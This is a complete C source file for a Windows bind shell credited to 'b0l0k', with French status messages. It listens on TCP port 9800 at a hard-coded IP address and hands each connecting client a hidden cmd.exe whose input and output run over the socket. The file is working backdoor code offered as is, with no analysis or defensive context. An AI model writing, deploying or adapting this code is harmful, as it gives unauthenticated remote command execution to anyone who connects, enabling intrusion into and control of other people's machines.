#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char *argv[])
{
    WSADATA wd;
    WSAStartup(MAKEWORD(1, 1), &wd);

    printf("Crée le socket\n");
    int sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in sin;
    struct sockaddr_in cli;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(9800);
    sin.sin_addr.s_addr = inet_addr("5.31.168.183");
    bind(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr));
    listen(sock, 0x5);
    while (1)
    {
        int client = accept(sock, NULL, NULL);
        send(client, "****Bindshell by b0l0k****\r\n", strlen("****Bindshell by b0l0k****\r\n"), 0);
        printf("Envoie le shell sur le socket\n");
        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client;
        int verdict = CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, TEXT("c:\\"), &si, &pi);
        if (verdict)
            printf("Ok\n");
        else
            printf("Erreur\n");
    }
}
